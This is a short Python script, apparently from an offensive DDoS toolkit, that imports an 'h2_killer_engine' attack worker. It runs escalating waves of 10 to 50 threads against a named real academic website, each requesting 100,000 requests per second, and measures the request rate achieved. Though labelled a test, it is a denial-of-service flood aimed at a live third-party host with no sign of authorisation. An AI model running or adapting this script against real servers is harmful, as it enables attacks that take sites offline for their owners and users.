"""Test max RPS with many workers."""
import sys, time, threading, queue
sys.path.insert(0, '.')
from core.attack.engines.h2_killer_engine import run_killer_worker

host = 'ojs.phb.ac.id'

for workers in [10, 20, 30, 40, 50]:
    stop = threading.Event()
    q = queue.Queue()
    results = []
    threads = []
    for wi in range(workers):
        r = {}
        results.append(r)
        t = threading.Thread(
            target=run_killer_worker,
            kwargs=dict(
                target_url='https://%s/' % host,
                rps=100000, duration=5, worker_id=wi,
                stats_queue=q, stop_event=stop,
                host_header=host, connections=4,
                result_dict=r,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=10)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    total = sum(r.get('sent', 0) for r in results)
    fails = sum(r.get('failed', 0) for r in results)
    rps = total / 5
    print(f'{workers} workers: total={total}, failed={fails}, RPS={rps:.0f}')
